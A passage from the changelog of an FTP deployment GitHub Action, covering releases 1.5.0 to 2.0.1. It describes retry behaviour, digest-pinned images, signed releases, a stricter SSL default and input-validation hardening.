- **B-02** (PR #50): `max_retries=0` now means "retry forever"
  (the only exits are lftp success or the 5h global timeout). The
  README and `action.yml` description already implied this but
  `init.sh` treated 0 as a single attempt. The loop guard now
  skips the counter check when `INPUT_MAX_RETRIES` is 0.
  Non-breaking for every caller that uses the default
  `max_retries=10`; only callers that explicitly passed
  `max_retries=0` see the change.

- **B-13** (already on `main` under `[Unreleased]`): Dockerfile
  now pins the base image by digest
  (`alpine@sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659`,
  the digest of `alpine:3.23.3` at the time of v2.0.1). The
  package versions are pinned too (`lftp=4.9.2-r9`,
  `ca-certificates=20260611-r0`), which resolves hadolint
  `DL3018`. Bumping the base image is now a controlled cadence
  done via the release pipeline; the next bump will need a digest
  refresh in the same commit that bumps the tag.

- **B-18** (PR #50): README examples now use `@v2` instead of
  `@latest`, with a callout recommending major-version pins over
  floating tags. The `@latest` / `@main` antipattern is now
  additionally enforced from inside the action via the
  deprecation warning above.

## [2.0.1] - 2026-07-05

Patch release on top of v2.0.0 — turns the "release pipeline"
PR (#46) on for real and lands the `latest` docker tag. **No
behaviour change for end users** (the action's input contract
is unchanged from v2.0.0).

### Added

- **Release pipeline to `ghcr.io` with cosign signing and CycloneDX SBOM** (PR #46). Every pushed `v*.*.*` tag is built into a Docker image at `ghcr.io/airvzxf/ftp-deployment-action`, signed with `cosign` (keyless OIDC), and ships a CycloneDX SBOM attached as an in-toto attestation via `actions/attest@v4`.
- **`latest` docker tag on every release** — the release workflow pushes `v<version>`, `<version>`, and `latest`, so `docker pull ghcr.io/airvzxf/ftp-deployment-action:latest` resolves to the newest v2.x (matching the semantics users expect).

### Fixed

- **Dockerfile** — pin the base image to the `alpine` digest `sha256:25109184…` and pin the apk package versions (`lftp=4.9.2-r9`, `ca-certificates=20260611-r0`); resolves the hadolint `DL3018` warning that was open since the first PR.
- **Release workflow** — download the SBOM artifact before attaching it via `actions/attest@v4`; install `cosign` via the upstream release tarball before the `sign` step.

The git-level `latest` tag that pointed at v1.3.3 was deleted
as part of this release.

## [2.0.0] - 2026-07-05

### Breaking

- `ssl_verify_certificate` default changed from `"false"` to `"true"`.
  This is a behaviour change for every existing v1.x user that relied
  on the lax default to connect to a self-signed or direct-IP
  server. With v2.0.0, the action refuses to connect to a server
  with an invalid, expired, or hostname-mismatched certificate.
  To opt back into the v1.x behaviour, set
  `ssl_verify_certificate: "false"` explicitly in your workflow.

  This is the breaking change promised in the original audit
  (PROPOSAL.md §3.1 #1 and the MP-1 entry). All other v1.x→v2.0.0
  changes are behaviour-preserving (the security hardening and
  validation work in v1.4.0 and v1.5.0 is compatible with the
  v1.x contract).

### Changed

- README: the "Security and SSL" section now documents the new
  default and the opt-out path; the warning is no longer about a
  known-insecure default but about the rare case of a user
  explicitly opting back into the v1.x lax behaviour.


## [1.5.0] - 2026-07-05

Bundles two PRs on top of v1.3.3 with no behaviour change for the
happy path (all changes are either bug fixes, new optional
inputs, or hardening that is observable only via exit code 2 on
malformed input).

### Added
- `mirror_verbose` input (was documented in the README but never declared in
  `action.yml`, so the value was silently ignored).
- `lftp_settings` input (was also undocumented in `action.yml`).
- `debug` input. Default `false` shows only which inputs were received; set
  to `true` to print resolved values for troubleshooting.
- `SECURITY.md` with private disclosure policy and supported-versions table.
- `CHANGELOG.md` (this file) following Keep a Changelog.
- `.dockerignore` to keep the build context minimal.
- Exit code documentation in the README (`0` success, `1` upload failed,
  `2` invalid input).
- `validate_int` helper in `init.sh` that fails fast with a clear error
  when an integer input (e.g. `max_retries`) is not a non-negative integer.
- `validate_path` helper for `local_dir` / `remote_dir`: rejects
  `..` path-traversal components, leading dashes (which `lftp` would
  misread as options), control characters, and shell metacharacters
  (`;`, `&`, `|`, backtick, dollar).
- `validate_lftp_settings` helper: light sanitization of the
  free-form `lftp_settings` input (rejects control characters,
  backtick, dollar, and more than three `;`-chained directives).
- Global 5-hour wall-clock timeout around each `lftp` invocation.
- Exponential backoff with jitter between retries (1s, 2s, 4s, 8s, 16s,
  then capped at 30s), replacing the previous flat 60s sleep.
- Last `lftp` exit code is printed in the failure banner for easier
  debugging.

### Fixed
- B-01: `mirror_verbose` is now a real, configurable input.
- B-05: `lftp` exit code is captured explicitly so the "ERROR" banner is
  always reached (previously `set -e` short-circuited the script).
- B-06: `INPUT_MAX_RETRIES` is now quoted in the comparison (shellcheck
  SC2086).
- B-07: `max_retries`, `mirror_verbose`, `ftp_nop_interval`,
  `net_max_retries`, `net_persist_retries` and `dns_max_retries` are
  validated as non-negative integers before use; the action now exits
  with code `2` and a clear error if any value is malformed.
- B-08: retry backoff is now exponential with jitter instead of a flat
  60 seconds; total wall-clock for the 10-retry default drops from
  ~10 minutes of pure sleeping to ~2.5 minutes.
- B-09: a hung `lftp` is now killed after 5 hours (with a 30s grace
  period before SIGKILL) instead of running until the runner timeout.
- B-10: input values are no longer echoed to the log by default; only
  their names and `(set)` / `(using default)` status. Set
  `debug: "true"` to see resolved values.
- B-11: README now explicitly distinguishes the minimal example from
  the "no default" extended example.
- B-12: `lftp_settings` is now declared in `action.yml` (previously
  referenced in `init.sh` and the README but invisible as an input).
- B-15: `.dockerignore` excludes `.git/`, `.github/`, `.idea/`,
  `.vscode/`, `.opencode/`, `.env*`, `PROPOSAL.md` and editor backups
  from the build context.

### Security
- B-03: password is no longer passed to `lftp` on the command line. The
  script now writes credentials to `~/.netrc` with mode `0600` for the
  duration of the run, and removes the file via an `EXIT` trap on any
  exit path (success, error, `set -e` abort, SIGINT).
- B-04: `local_dir` and `remote_dir` are validated against
  `..` path-traversal components, leading dashes, control characters,
  and shell metacharacters.
- B-14: the container now runs as the unprivileged `lftp` user (an
  `addgroup` / `adduser` was added in the Dockerfile and a `USER lftp`
  directive runs every process under that uid). The previous
  container ran every process as root.
- B-16: `lftp_settings` is lightly sanitised: control characters,
  backtick, dollar, and more than three `;`-chained directives are
  rejected at the input layer.
- Password and other input values are no longer printed to the workflow
  log by default.


## [1.3.3] - 2024-XX-XX

Historical. See git history for changes prior to `CHANGELOG.md` adoption.


[2.11.8]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.7...v2.11.8
[2.11.7]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.6...v2.11.7
[2.11.6]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.5...v2.11.6
[2.11.5]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.4...v2.11.5
[2.11.4]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.3...v2.11.4
[2.11.3]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.2...v2.11.3
[2.11.2]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.1...v2.11.2
[2.11.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.11.0...v2.11.1
[2.11.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.10.0...v2.11.0
[2.10.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.9.0...v2.10.0
[2.9.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.8.0...v2.9.0
[2.8.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.7.0...v2.8.0
[2.7.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.6.0...v2.7.0
[2.6.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.5.0...v2.6.0
[2.5.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.4.1...v2.5.0
[2.4.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.4.0...v2.4.1
[2.4.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.3.1...v2.4.0
[2.3.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.3.0...v2.3.1
[2.3.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.2.0...v2.3.0
[2.2.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.1.0...v2.2.0
[2.1.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.0.1...v2.1.0
[2.0.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.0.0...v2.0.1
[2.0.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v1.5.0...v2.0.0
[1.5.0]: https://github.com/airvzxf/ftp-deployment-action/releases/tag/v1.5.0
[1.3.3]: https://github.com/airvzxf/ftp-deployment-action/releases/tag/v1.3.3
